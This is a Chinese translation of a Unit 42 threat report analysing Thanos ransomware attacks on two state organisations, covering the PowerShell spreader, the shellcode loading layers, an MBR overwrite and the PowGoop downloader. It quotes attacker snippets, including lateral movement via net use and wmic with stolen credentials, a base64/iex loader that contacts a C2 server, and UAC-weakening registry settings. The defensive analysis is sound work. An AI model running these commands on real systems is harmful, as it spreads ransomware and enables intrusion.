**译者：知道创宇404实验室翻译组**  
**原文链接：<https://unit42.paloaltonetworks.com/thanos-ransomware/>**

## 摘要

在2020年7月6日和7月9日，我们观察到与对中东和北非的两个国有组织的攻击有关的文件，这些组织最终安装并运行了Thanos勒索软件的变体。Thanos变体创建了一个文本文件，该文件显示赎金消息，要求受害者将“
20,000 $”转入指定的比特币钱包以恢复系统上的文件。我们无法了解这些攻击的总体影响，也无法了解攻击者是否成功从受害者那里获得了付款。

![](https://images.seebug.org/content/images/2020/09/325cc4fb-033f-4374-93f3-bedbf01cd93a.png-w331s)
图1.加密文件后显示的Thanos赎金记录。

勒索软件还被配置为覆盖主引导记录（MBR），主引导记录是加载到系统硬盘上的一个重要组件，计算机需要它来定位和加载操作系统。勒索软件重写MBR以显示与前面提到的文本文件相同的勒索消息，这是一种我们不常看到的技术。我们观察到的最显著的例子涉及2017年的[Petya勒索软件](https://unit42.paloaltonetworks.com/unit42-threat-brief-petya-ransomware/
"Petya勒索软件")。重写MBR是一种比通常更具破坏性的勒索软件方法。即使受害者支付了赎金，他们也必须付出更多的努力来找回他们的档案。幸运的是，在本例中，负责覆盖MBR的代码导致了异常，因为ransom消息包含无效字符，这使得MBR保持完整，并允许系统正确引导。这意味着，即使勒索软件被配置为覆盖MBR，攻击者也无法成功导致感染Thanos勒索软件的计算机无法启动。

![](https://images.seebug.org/content/images/2020/09/c5dc84af-6a6e-4d72-988a-707e7e4012ee.png-w331s)
图2.如果MBR覆盖成功，则会显示Thanos赎金记录。

Thanos勒索软件最初是由[Recorded Future](https://www.recordedfuture.com/thanos-ransomware-builder/ "Recorded
Future")在2020年2月提出的，当时它在地下论坛上做广告出售。Thanos勒索软件具有一个构建器，该构建器允许参与者使用多种可用设置来自定义样本。Thanos待售的事实表明，攻击者可能使用此勒索软件。但是，我们充满信心地认为，同一攻击者在袭击中东和北非的两个国有组织时使用了Thanos变体。

根据遥测技术，我们于2020年1月13日首次观测到Thanos，此后已观测到130多个独特样本。我们认为攻击者可以事先访问这些组织的网络，因为样本包含凭据，我们相信这些参与者在交付勒索软件之前已从这些组织的网络中的系统中窃取了凭据。

这种特殊的攻击涉及多层PowerShell脚本，内联C＃代码和Shellcode，以便将Thanos加载到内存中并在本地系统上运行。这些层主要基于可在开源框架（例如[Sharp-Suite](https://github.com/FuzzySecurity/Sharp-Suite "Sharp-Suite")和[Donut](https://github.com/TheWover/donut
"Donut")）中免费获得的代码。其中一层涉及自定义PowerShell，该PowerShell负责使用前面提到的被盗凭据将Thanos传播到本地网络上的其他系统。

我们分析了攻击者为中东和北非国营组织建立的这个特定的Thanos样本。我们确定这些组织已将勒索软件加载到内存中并在内存中运行。我们发现Thanos变体在功能上与[Fortinet](https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode
"Fortinet")在2020年7月讨论的变体非常相似。Fortinet分析的样本还包含启用的网络传播功能，其中包括来自与我们所观察到的中东国营组织位于同一直辖市的另一个国营组织的网络凭证。Fortinet分析的样本包括我们观察到的相同的比特币钱包和联系电子邮件。当与在相同时间范围内以同一城市中的组织作为目标的目标相结合时，这表明这些攻击背后的共同行动者。

Palo Alto
Networks的客户免受[Wildfire](https://www.paloaltonetworks.com/products/secure-the-network/wildfire "Wildfire")和Cortex XDR的保护，这些攻击由WildFire和Cortex
XDR保护，WildFire正确地将所有相关样本识别为恶意样本，[Cortex
XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr "Cortex
XDR")阻止了与勒索软件感染有关的组件。

## Thanos变体活动概述

我们不知道这些参与者是如何将Thanos勒索软件交付给中东和北非的两个国有组织的。但是，我们知道，使用这些工具背后的威胁组织先前已经访问了这些网络，因为它们已经从网络中获取了有效的凭据。在这两个组织中都使用了完全相同的Thanos样本，这表明同一演员使用Thanos构建器创建了样本。

为这些网络创建的Thanos示例在.NET
Thanos勒索软件在系统上运行之前执行几层，特别是使用来自多个开源框架的代码。这些层从一个PowerShell脚本开始，该脚本不仅将另一个PowerShell脚本作为子层加载，而且还尝试使用以前被盗的凭据将勒索软件传播到网络上的其他系统。第二层中的PowerShell只做内联加载嵌入式C＃代码，因此初始PowerShell脚本可以执行它。C＃代码是第三层，它基于[UrbanBishop](https://github.com/FuzzySecurity/Sharp-Suite/blob/master/UrbanBishop/BerlinDefence.cs
"UrbanBishop")，可作为GitHub上[Sharp-Suite](https://github.com/FuzzySecurity/Sharp-Suite "Sharp-Suite")框架的一部分公开获得。UrbanBishop代码负责将shellcode写入远程进程并执行它，其中shellcode是运行Thanos勒索软件之前的最后一层。在这种情况下，shellcode是由Donut创建的，Donut是另一个开源框架，它将生成可以在内存中加载和执行.NET程序集的shellcode。

![](https://images.seebug.org/content/images/2020/09/416d9497-64c6-49e4-9279-28672191295a.png-w331s)

图3.为在系统上运行Thanos勒索软件而执行的层。

## PowerShell传播器

PowerShell扩展器（我们称为LogicalDuckBill）具有两个主要用途：

  * 1.加载并运行Thanos勒索软件。

  * 2.通过将自身复制到远程系统并在远程系统上执行，将其传播到其他系统。

LogicalDuckBill中的加载程序功能以base64编码的PowerShell脚本开始，它将使用IEX命令解码并运行。解码并执行的PowerShell包含以下代码，该代码有效地加载基于UrbanBishop的C＃代码，随后LogicalDuckBill将调用该代码以注入Shellcode：

    
    
    $ code = @”
    [基于UrbanBishop的C＃代码]
    “ @
    Add-Type -TypeDefinition $ code -Language CSharp

然后，LogicalDuckBill将在运行之前检查“c：\”驱动器中是否存在名为“logdb.txt”或“logdb.txt.locked”的文件，这是散布器用来确保仅运行一个实例的方法每个系统上的嵌入式勒索软件的数量。我们还观察到另一个相关示例，该示例查找“logdbnnn.txt”，这就是为什么我们将此脚本称为LogicalDuckBill。如果这些文件不存在，则LogicalDuckBill将向该文本文件写入“1”，然后继续执行其功能。

然后，LogicalDuckBill创建一个“notepad.exe”进程，然后它将在正在运行的进程中进行迭代以查找已创建的“notepad.exe”进程的进程ID（PID）。使用记事本进程的PID，PowerShell脚本基于UrbanBishop在已加载的C＃代码中调用“Do”方法，最终将Donut框架生成的shellcode注入记事本进程并执行。然后，shellcode解密并将嵌入式.NET可执行文件加载到内存中并执行该程序，这就是Thanos勒索软件有效载荷。

LogicalDuckBill的扩展器功能从使用`Get-NetTCPConnection
cmdlet`的脚本开始，以获取系统上当前TCP连接的远程地址。然后代码看起来通过为那些与启动这些远程地址10，172和192作为第一字节和通过每个发现的网络通过改变从最后一个八位字节将迭代1至254中的循环。对于每次迭代，该脚本将使用`Test-NetConnection cmdlet`来查看该脚本是否可以通过SMB端口`tcp / 445`连接到每个远程系统，如果可以，它使用`net
use`命令以以前的方式连接到远程系统。凭证被盗并安装远程系统的C：驱动器到本地系统的X：驱动器。然后，脚本使用copy命令将自身复制到新映射的X：驱动器，该驱动器将LogicalDuckBill有效地复制到远程系统。然后，脚本将使用wmic在远程系统上运行流程调用create，以在远程系统上运行新复制的LogicalDuckBill示例。扩展功能通过删除映射的驱动器来完成每次迭代，所有这些操作均通过以下代码执行：

    
    
    if((Test-NetConnection $tr -Port 445).TcpTestSucceeded){
    
    net use x: \\[IP address]\c$ /user:[Victim Domain]\[Username] [Password]
    
    copy c:\windows\update4.ps1 x:\windows\update4.ps1
    
    wmic /node:[IP address] /user:[Victim Domain]\[Username] /password:[Password] process call create “powershell -exec bypass -file c:\windows\update4.ps1”
    
    net use x: /del /y
    
    }

LogicalDuckBill中的这种传播方法与Thanos的C＃代码中的传播方法相似。但是，使用PowerShell脚本来传播允许参与者在创建映射驱动器和使用wmic运行复制的PowerShell脚本时包含以前被盗的网络凭据。

## Thanos勒索软件

Thanos勒索软件是由Recorded
Future在2020年2月首次发现的，当时它在地下论坛上做广告出售。Thanos勒索软件的代码与其他勒索软件变体（例如Hakbit）重叠，并且具有允许用户使用各种可用设置自定义样本的构建器。该勒索软件似乎仍在积极开发中，因为与Recorded
Future分析的原始样本相比，我们观察到了在中东和北非国有企业运行的样本中新增的功能。实际上，运行在这两个组织网络上的Thanos勒索软件在可用功能上更接近于Fortinet在2020年7月讨论的变体。最明显的区别是，这些示例中没有提供Fortinet讨论的禁用安全启动的功能。

与其他Thanos勒索软件示例一样，在这两个组织的网络上运行的变体使用2048位RSA公钥加密文件扩展名与表1中列出的文件扩展名匹配的文件。加密文件内容后，Thanos会将文件扩展名“.locked”添加到磁盘上的文件中。

![](https://images.seebug.org/content/images/2020/09/02130448-055e-46f4-ad2d-59b20c8c6f56.png-w331s)
表1. Thanos将加密的文件扩展名列表。

Thanos的这种变体将赎金记录写入名为“HOW_TO_DECYPHER_FILES.txt”的文件到桌面以及包含Thanos加密的文件的所有文件夹中。如图2所示，赎金记录要求将价值“
20,000美元”的比特币转移到钱包“1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9”和联系电子邮件“josephnull@secmail.pro”，以恢复加密文件。Fortinet博客和几条推文中显示的.HTA赎金说明显示，其他研究人员和组织在2020年7月看到了联系电子邮件和比特币钱包ID
。

![](https://images.seebug.org/content/images/2020/09/15e079ba-d55e-4201-a684-1a474d31b7a0.png-w331s)

Thanos勒索软件中的功能已被其他组织进行了分析。除了重新散布该分析之外，我们将仅讨论在此Thanos变体中启用的功能，而以前没有讨论过。但是，我们分别在表2和3中描述了在Thanos的此变体中禁用和启用的先前讨论的功能。

![](https://images.seebug.org/content/images/2020/09/8be461b0-fbff-43c0-b160-62bf47498740.png-w331s)
表2.禁用的功能，可能是Thanos勒索软件构建器用户界面（UI）上的未选中框。

![](https://images.seebug.org/content/images/2020/09/0f436b6c-9636-4e1c-9381-bf0063210159.png-w331s)
表3.启用的功能，可能是Thanos勒索软件构建器UI上的复选框。

启用的第一个配置选项与先前的Thanos变体的分析不匹配，首先是代码尝试禁用用户帐户控制（UAC），方法是将`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`中的键“LocalAccountTokenFilterPolicy”和“EnableLinkedConnections”设置为1。然后，它尝试枚举本地和映射的存储卷。与omlocker用于枚举卷的本地脚本几乎完全相同。Ragnar
Locker使用此脚本创建一个VirtualBox配置文件，该文件将这些卷设置为SharedFolders，从而允许Ragnar
Locker在VirtualBox虚拟机中运行时访问本地存储卷，正如[Sophos](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/
"Sophos")所讨论的那样。Thanos实现不会将结果写入VirtualBox配置文件。相反，它只是将配置打印到屏幕上，但不保存输出。因此，我们无法确定此功能的用途。

此示例中启用的第二个功能在以前的Thanos变体中没有观察到，它涉及覆盖主引导记录（MBR）的能力。一旦代码检查操作系统版本不是“Windows
10”而是“Windows
8”，代码将尝试打开“\\.\PhysicalDrive0”并写入512字节字符串以偏移0。写入“\\.\PhysicalDrive0”偏移量0的字节数组最初有一条勒索消息：“您的文件已加密”。联系我们：get-my-data@protonmail.com“…”，但在写入磁盘之前，代码将用以下字符串替换此字符串：

    
    
    Don\xe2\x80\x99t worry, you can return all your files!\r\n\r\nThe Price to get all things to the normal : 20,000$\r\nMy BTC Wallet ID :\r\n1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9\r\n\r\nContact: josephnull@secmail.pro\r\n

在此特定示例中覆盖MBR的有趣之处在于它无法正常工作，这可以归因于编程错误或参与者包括的自定义消息。如上所示，自定义消息中的撇号字符的字节为“\xe2\x80\x99”，但代码尝试使用转换.ToByte函数替换初始赎金字符串中的单个字节。但是，Unicode单引号字符是三个字节长，并导致异常，该异常打破了MBR覆盖功能。我们确认，更改此单个字符后，MBR覆盖功能将起作用，从而导致显示以下内容，而不是Windows正常启动：

![](https://images.seebug.org/content/images/2020/09/d884840c-941d-49a9-99fa-431e12286962.png-w331s)

在Thanos示例中，第三个先前未提及的功能涉及创建监视新连接的存储卷的线程。该代码使用管理事件监视程序，当使用以下WMI查询连接新的存储卷时，该事件监视程序将调用函数：

    
    
    SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2

当事件监视程序检测到新连接的存储卷时，它将创建一个线程，该线程执行Thanos用来加密原始存储卷上的文件的文件加密功能。

此版本的Thanos中添加的最后一个功能是能够检测并杀死更多分析工具以逃避检测和分析的能力。该示例将枚举正在运行的进程，并杀死名称与以下内容匹配的进程：

![](https://images.seebug.org/content/images/2020/09/1f3b551f-bba5-4700-92cf-376f40d4abcc.png-w331s)
表4.此Thanos变体将检测并杀死以逃避检测的工具列表。

## 可能相关的下载器：PowGoop简介

虽然我们无法确认这一联系，但我们相信，在中东国营组织部署塔诺斯勒索软件的人也使用了一个我们称之为PowGoop的下载程序。参与者将使用PowGoop下载器联系远程服务器，下载并执行其他PowerShell脚本。这些文件与前面讨论的LogicalDuckBill示例存在于同一个环境中，但是我们没有观察到具体运行PowGoop和LogicalDuckBill扩展器的参与者。而且，正如预期的那样，这个下载器中的PowerShell代码和LogicalDuckBill之间几乎没有代码重叠，因为它们的功能差别很大。唯一的代码重叠是一个公共变量名$a，这两个脚本在解码之前都用来存储base64编码的数据，这不是一个足够强的连接，不足以建议一个共同的作者。

PowGoop下载程序有两个组件：DLL加载程序和基于PowerShell的下载程序。PowGoop加载器组件负责解密和运行包含PowGoop下载器的PowerShell代码。与LogicalDuckBill位于同一环境中的PowGoop加载程序DLL的文件名为谷歌更新.dll这很可能是由合法的和签名的googleupdate可执行文件附带的。旁加载过程将从合法的谷歌更新.exe文件正在加载名为goupdate86.DLL的合法DLL。当goopdate86.dll库加载谷歌更新.dll文件，它有效地运行PowGoop加载程序。我们观察到以下可能相关的文件：

![](https://images.seebug.org/content/images/2020/09/2ee71bc5-8cbb-47b2-94e3-44a75d821ff6.png-w331s)
表5.与PowGoop下载器的侧面加载相关的文件列表。

goopdate.dll文件是PowGoop加载程序，其功能存在于名为DllRegisterServer的导出函数中。goopdate.dll文件的DllEntryPoint函数（如果通过上述侧面加载过程加载了该函数，则将被调用），无非就是尝试使用以下命令来运行DllRegisterServer导出的函数：`rundll32.exe
<module filename>,DllRegisterServer`

DllRegisterServer中的功能代码读取名为config.dat的文件，对其进行解码并将其作为PowerShell脚本运行，该脚本是PowGoop下载器组件。为了解码config.dat文件，DLL使用CreateProcessA函数构建并执行PowerShell脚本。由PowGoop加载程序构建的PowerShell脚本将读取config.dat文件的内容，使用简单的两个减法运算法则对base64内容进行解码和解密，并使用IEX命令运行结果PowGoop下载程序脚本，如下所示：

    
    
    powershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] – 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content C:\\Users\\[username]\\Desktop
    
    config.dat;$t =bDd $a;iex($t);

我们解密的config.dat文件是PowGoop下载器，参与者将其配置为使用以下URL作为其命令和控件（C2）：`http://107.174.241[.]175:80/index.php`

PowGoop下载器将通过对此URL的HTTP
GET请求与C2服务器通信。它期望C2服务器用base64编码的数据响应请求，脚本将对这些数据进行解码，并使用System.IO.压缩.GzipStream，然后使用用于解密配置数据文件。它将首先与指挥控制系统通信，以获得指挥与控制系统将分配给受损系统的唯一标识符值。在获得此标识符后，脚本将继续与C2通信以获取任务，该脚本将解码、解压缩、解密并作为PowerShell脚本运行。该脚本通过使用add-by-two密码对结果进行加密、压缩密文并对其进行base64编码，并使用GET请求将其发送到C2服务器，其中包含HTTP请求的Cookie字段中的数据，特别是R值。

## 结论

Actors使用Thanos勒索软件对文件进行加密，并使用PowerShell脚本将其传播到其他系统，特别是在中东和北非两个国有组织的网络上。Thanos变体创建了一个文本文件，该文件显示赎金消息，要求受害者将“20,000
$”转入指定的比特币钱包以恢复系统上的文件。

尽管Thanos勒索软件不是新的，但由于这些攻击中使用的变体包含新功能，因此它仍处于积极开发中。新功能包括检测和逃避更多分析工具的能力，通过Ragnar
Locker勒索软件使用的技术对本地存储卷进行枚举以及监视新连接的存储设备的新功能。

最重要的是，Thanos的这种变体还包括覆盖MBR并显示相同赎金消息的新功能。覆盖MBR是一种比Thanos以前使用的破坏性更大的勒索软件，即使受害者支付了赎金，受害者也需要付出更多的努力才能恢复其文件。

通过以下方式，Palo Alto Networks客户可以免受此博客中讨论的攻击的侵害：

  * 所有已知的Thanos勒索软件和LogicalDuckBill样本在[WildFire](https://www.paloaltonetworks.com/products/secure-the-network/wildfire "WildFire")中都有恶意判定。

  * AutoFocus客户可以使用标签[Thanos](https://login.paloaltonetworks.com/?resume=/idp/PoIdl/resumeSAML20/idp/startSSO.ping&spentity=CanarySp "Thanos")，[LogicalDuckBill](https://autofocus.paloaltonetworks.com/#/tag/Unit42.LogicalDuckBill "LogicalDuckBill")和[PowGoop](https://login.paloaltonetworks.com/?resume=/idp/njEtr/resumeSAML20/idp/startSSO.ping&spentity=CanarySp "PowGoop")跟踪此勒索软件，PowerShell传播脚本以及可能相关的下载器。

  * [Cortex XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr "Cortex XDR")阻止了Thanos勒索软件，LogicalDuckBill和PowGoop。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1330/>

